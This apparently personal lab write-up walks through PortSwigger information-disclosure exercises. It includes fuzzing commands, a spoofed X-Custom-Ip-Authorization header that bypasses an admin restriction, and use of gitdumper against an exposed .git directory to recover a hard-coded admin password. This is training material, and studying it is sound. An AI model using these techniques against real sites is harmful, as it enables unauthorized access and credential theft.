

# Information disclosure Lab

content: https://portswigger.net/web-security/information-disclosure#what-is-information-disclosure

[How to find and exploit information disclosure vulnerabilities](https://portswigger.net/web-security/information-disclosure/exploiting#common-sources-of-information-disclosure)

### **How to test for information disclosure vulnerabilities**

The following are some examples of high-level techniques and tools that you can use to help identify information disclosure vulnerabilities during testing.

- [Fuzzing](https://portswigger.net/web-security/information-disclosure/exploiting#fuzzing)
- [Using Burp Scanner](https://portswigger.net/web-security/information-disclosure/exploiting#using-burp-scanner)
- [Using Burp's engagement tools](https://portswigger.net/web-security/information-disclosure/exploiting#using-burp-s-engagement-tools)
- [Engineering informative responses](https://portswigger.net/web-security/information-disclosure/exploiting#engineering-informative-responses)

## Common sources of information disclosure

Information disclosure can occur in a wide variety of contexts within a website. The following are some common examples of places where you can look to see if sensitive information is exposed.

- [Files for web crawlers](https://portswigger.net/web-security/information-disclosure/exploiting#files-for-web-crawlers)
- [Directory listings](https://portswigger.net/web-security/information-disclosure/exploiting#directory-listings)
- [Developer comments](https://portswigger.net/web-security/information-disclosure/exploiting#developer-comments)
- [Error messages LABS](https://portswigger.net/web-security/information-disclosure/exploiting#error-messages)
- [Debugging data LABS](https://portswigger.net/web-security/information-disclosure/exploiting#debugging-data)
- [User account pages LABS](https://portswigger.net/web-security/information-disclosure/exploiting#user-account-pages)
- [Backup files LABS](https://portswigger.net/web-security/information-disclosure/exploiting#source-code-disclosure-via-backup-files)
- [Insecure configuration LABS](https://portswigger.net/web-security/information-disclosure/exploiting#information-disclosure-due-to-insecure-configuration)
- [Version control history LABS](https://portswigger.net/web-security/information-disclosure/exploiting#version-control-history)

## Lab-1: **Lab: Information disclosure in error messages**

1. I tried to find these pages `/robots.txt` and `/sitemap.xml`

```jsx
HTTP/2 404 Not Found
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 11

"Not Found"
```

1. I examined the source code

1. I added single quote next to the product number to see how the application response to it:

```bash
# request:
GET /product?productId=2' 

# '#response:
HTTP/2 500 Internal Server Error
Content-Length: 1684

Internal Server Error: java.lang.NumberFormatException: For input string: "2'"
	at java.base/java.lang.NumberFormatException.forInputString(NumberFormatException.java:67)
	...
	at 

Apache Struts 2 2.3.31
```

the error message revealed that the application is usinng Apace struts 2.3.31 which has a RCE vulnerability on the wild https://www.exploit-db.com/exploits/41570

## **Lab 2 : Information disclosure on debug page**

Debug messages can sometimes contain vital information for developing an attack, including:

- Values for key session variables that can be manipulated via user input
- Hostnames and credentials for back-end components
- File and directory names on the server
- Keys used to encrypt data transmitted via the client

while examining the source code of the home page i found an interesting comment

```jsx
</section>
                    <!-- <a href=/cgi-bin/phpinfo.php>Debug</a> -->
                </div>
            </section>
```

![Alt](/HTB/Web_Penetration_Tester/Information_Gathering/Images/L1.png)

## Lab-3: Source code disclosure via backup files

> Forcing the web server to return raw application code rather than executing it, typically by targeting forgotten backup, temporary, or text-editor-generated files.
> 
- **The Goal:** Accessing backend logic to map out hidden endpoints, find cryptographic flaws, or extract hard-coded secrets (API keys, database credentials).
- **The Execution Failure:** Servers are configured to *execute* standard extensions (like `.php`, `.jsp`, `.asp`) instead of serving them as plaintext.
- **The Bypass:** Text editors (like Vim, Nano) and backup scripts often create temporary file copies with modified extensions. Since the web server doesn't recognize these new extensions as executable scripts, it serves them as harmless, raw plaintext.

### 💡 Bug Bounty / Exam Pro-Tips (Bonus Info)

- **Common Backup Extensions to Fuzz:**
    - **Editor Swp/Temp Files:** `.index.php.swp` (Vim crash files), `index.php~` (tilde backups), `.index.php.un~`.
    - **Manual Backups:** `index.php.bak`, `index.php.old`, `index.php.1`, `index.original`, `index.php.zip`, `index.php.tar.gz`.
- **Automating the Hunt:** Don't just look for `index`. Use tools like `ffuf`, `gobuster`, or `dirsearch` with a specialized backup extension wordlist (e.g., SecLists' `raft-medium-words-lowercase.txt` combined with extensions).
- **Open-Source Recon:** If the target uses an open-source CMS (like WordPress or Drupal), download the public source code locally. It helps you map out the exact paths, variable names, and look for custom modifications the target might have added.

### Lab:

This lab leaks its source code via backup files in a hidden directory. To solve the lab, identify and submit the database password, which is hard-coded in the leaked source code. 

I first started directory fuzzing and found:

```bash
$ ffuf -w /usr/share/wordlists/dirb/common.txt -u "<https://0af200dd0430408e80bf447b0019004b.web-security-academy.net/FUZZ>" -H "Cookie: session=tQX1U4gg0W9QR3FvXZ9MxVfzBa6hs8fl"  -s

analytics
backup
favicon.ico
filter
robots.txt
```

I found a backup file in backup folder

```bash
GET /backup/ProductTemplate.java.bak
```

also in the `robots.txt`, it reveals:

```bash
User-agent: *
Disallow: /backup
```

## Lab4: **Authentication bypass via information disclosure**

https://portswigger.net/web-security/information-disclosure/exploiting#common-sources-of-information-disclosure

The core concept behind using the `TRACE` method here isn't to bypass an authentication mechanism using `TRACE` itself. Instead, you are using `TRACE` as a **reconnaissance tool** to discover a hidden header that you can *then* use to bypass a restriction on a standard request (like a `POST` or `GET`).

when I send a trace request

```bash
TRACE /login HTTP/2
...

csrf=YS9yZqIRFsJSY3IRhpDGwIkbOfbY0EBC&username=wiener&password=peter
```

the web server/reverse proxy bounced the request back to me exactly as it received, but there was a hidden header that i didnt send, which is `X-Custom-IP-Authorization`

```bash
cookie: session=wH9f3FK68RGNTamiV87oJJdHfPVyzlr5
Content-Length: 68
X-Custom-IP-Authorization: 66.118.176.240

csrf=YS9yZqIRFsJSY3IRhpDGwIkbOfbY0EBC&username=wiener&password=peter
```

Now we can spoof or manipulate this header in the requests (like `POST /login` or `GET /admin`) to trick the backend into thinking we are coming from a trusted IP address (e.g., localhost `127.0.0.1`).

I intercepted the home page of the user wiener and added this header `X-Custom-Ip-Authorization: 127.0.0.1`

```bash
GET /my-account?id=wiener HTTP/2
Host: 0a1000b504f9a23881ae11af00290073.web-security-academy.net
Cookie: session=QjgOwVUz39IUR5cxbkDWXSNhV83yOyiE
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="137", "Not/A)Brand";v="24"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a1000b504f9a23881ae11af00290073.web-security-academy.net/login
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
X-Custom-Ip-Authorization: 127.0.0.1
```

the result, we got an admin panel

![Alt](/HTB/Web_Penetration_Tester/Information_Gathering/Images/L2.png)

and if we try to access the admin panel /admin without adding the hidden header we will got this error:

```bash
HTTP/2 401 Unauthorized
Content-Type: text/html; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 2706

                   Admin interface only available to local users

```

## Lab-5: **Information disclosure in version control history**

> Production web servers improperly exposing the hidden root directory of version control systems (like Git), allowing an attacker to download the repository, view commit histories, and extract code or secrets.
> 

### Points to Memorize

- **The Vulnerability:** The software deployment process incorrectly leaves the hidden `/.git/` folder accessible to the public web root.
- **The Attack Vector:** An attacker navigates to `https://target.com/.git/` to verify exposure.
- **The Exploitation Process:**
    - 1. Download the entire directory structure locally.
    - 2. Use local Git commands (or specialized extractors) to reconstruct the repository.
- **The Impact:** Access to the application's development timeline, author metadata, code modifications (diffs), and hard-coded sensitive data (e.g., API keys, database credentials left in old commits).

### Pro-Tips

- **Reconstructing the Source:** If the full `.git` folder structure is successfully dumped, you can often restore the **entire application source code** up to the last commit, not just small snippets.
- **Automating the Collection:** Manual browsing is tedious. Use tools like `git-dumper` or `GitTools` to automatically scrape and rebuild the folder structure.
- **Key Files to Check First:**
    - `/.git/config`: Often reveals internal repository URLs, private tokens, or development subdomains.
    - `/.git/logs/HEAD`: Contains the history of commits, helping you identify exactly where developers might have added and then tried to "delete" sensitive keys.
- **Alternative Version Control:** If Git isn't present, always fuzz for `/.svn/` (Subversion) or `/.hg/` (Mercurial).

### Lab

 This lab discloses sensitive information via its version control history. To solve the lab, obtain the password for the `administrator` user then log in and delete the user `carlos`.
        

```bash
$ ffuf -w /usr/share/wordlists/dirb/common.txt -u "https://0a9d00650364ecc0841c362600a2000b.web-security-academy.net/FUZZ" -H "Cookie: session=XMd9i3wrowO6CA4KJ35oBjPZxtCFGSqB"  -s
.git/HEAD

Admin
ADMIN
admin
analytics
filter
favicon.ico
Login
login
logout
my-account
```

```bash
$ curl -H $'Host: 0a9d00650364ecc0841c362600a2000b.web-security-academy.net'  -b $'session=XMd9i3wrowO6CA4KJ35oBjPZxtCFGSqB'    $'https://0a9d00650364ecc0841c362600a2000b.web-security-academy.net/.git' 
    

            
            '/.git/branches/'
            '/.git/description'
            '/.git/hooks/'
            '/.git/info/'>
            '/.git/refs/'>
            '/.git/HEAD'
            '/.git/config'
            '/.git/objects/'
            '/.git/index'
            '/.git/COMMIT_EDITMSG'
            '/.git/logs/'

```

clone this repository so we can download the git directory

```bash
$ git clone https://github.com/internetwache/GitTools.git
```

```bash
$ ./gitdumper.sh https://0a9d00650364ecc0841c362600a2000b.web-security-academy.net/.git/ ../../
###########
# GitDumper is part of https://github.com/internetwache/GitTools
#
# Developed and maintained by @gehaxelt from @internetwache
#
# Use at your own risk. Usage might be illegal in certain circumstances. 
# Only for educational purposes!
###########

[*] Destination folder does not exist
[+] Creating ../..//.git/
[+] Downloaded: HEAD
[-] Downloaded: objects/info/packs
[+] Downloaded: description
[+] Downloaded: config
[+] Downloaded: COMMIT_EDITMSG
[+] Downloaded: index
[-] Downloaded: packed-refs
[+] Downloaded: refs/heads/master
[-] Downloaded: refs/remotes/origin/HEAD
[-] Downloaded: refs/stash
[+] Downloaded: logs/HEAD
[+] Downloaded: logs/refs/heads/master
[-] Downloaded: logs/refs/remotes/origin/HEAD
[-] Downloaded: info/refs
[+] Downloaded: info/exclude
[-] Downloaded: /refs/wip/index/refs/heads/master
[-] Downloaded: /refs/wip/wtree/refs/heads/master
[+] Downloaded: objects/c1/c1089adb8e4e642b2c35952d42f2e1407201db
[-] Downloaded: objects/00/00000000000000000000000000000000000000
[+] Downloaded: objects/87/408f8978d7a6730279b979f7bc7166d5cd91a5
[+] Downloaded: objects/21/54555944002791a4d27412bf6e9a6f29e942fa
[+] Downloaded: objects/e1/5d051dd175789f39037bcec2037a920c1554b0
[+] Downloaded: objects/21/d23f13ce6c704b81857379a3e247e3436f4b26
[+] Downloaded: objects/89/44e3b9853691431dc58d5f4978d3940cea4af2
[+] Downloaded: objects/28/8573f6f1a70fc55591135d923ac8c9a086dc85
                                                          
```

```bash
─$ ls -al ../../.git
total 44
drwxrwxr-x  6 kali kali 4096 Jun  8 12:42 .
drwxrwxr-x  6 kali kali 4096 Jun  8 12:42 ..
-rw-rw-r--  1 kali kali   34 Jun  8 12:42 COMMIT_EDITMSG
-rw-rw-r--  1 kali kali  157 Jun  8 12:42 config
-rw-rw-r--  1 kali kali   73 Jun  8 12:42 description
-rw-rw-r--  1 kali kali   23 Jun  8 12:42 HEAD
-rw-rw-r--  1 kali kali  225 Jun  8 12:42 index
drwxrwxr-x  2 kali kali 4096 Jun  8 12:42 info
drwxrwxr-x  3 kali kali 4096 Jun  8 12:42 logs
drwxrwxr-x 10 kali kali 4096 Jun  8 12:42 objects
drwxrwxr-x  5 kali kali 4096 Jun  8 12:42 refs

```

In the COMMIT_EDITMSG file, we know that the admin password was deleted

```bash
─$ cat ../../.git/COMMIT_EDITMSG 
Remove admin password from config

$ cat ../../.git/confi
[core]
        repositoryformatversion = 0
        filemode = true
        bare = false
        logallrefupdates = true
[user]
        email = carlos@carlos-montoya.net
        name = Carlos Montoya

```

to recover it or view the deleted version, first view the log

```bash
$ git log   
commit c1c1089adb8e4e642b2c35952d42f2e1407201db (HEAD -> master)
Author: Carlos Montoya <carlos@carlos-montoya.net>
Date:   Tue Jun 23 14:05:07 2020 +0000

    Remove admin password from config

commit 87408f8978d7a6730279b979f7bc7166d5cd91a5
Author: Carlos Montoya <carlos@carlos-montoya.net>
Date:   Mon Jun 22 16:23:42 2020 +0000

    Add skeleton admin panel

```

Then use the commit hash of the deleted version to view it using `show` command

```bash
$ git show c1c1089adb8e4e642b2c35952d42f2e1407201db           
commit c1c1089adb8e4e642b2c35952d42f2e1407201db (HEAD -> master)
Author: Carlos Montoya <carlos@carlos-montoya.net>
Date:   Tue Jun 23 14:05:07 2020 +0000

    Remove admin password from config

diff --git a/admin.conf b/admin.conf
index 288573f..21d23f1 100644
--- a/admin.conf
+++ b/admin.conf
@@ -1 +1 @@
-ADMIN_PASSWORD=wxxtku6vzpjczfrdvcgd
+ADMIN_PASSWORD=env('ADMIN_PASSWORD')

```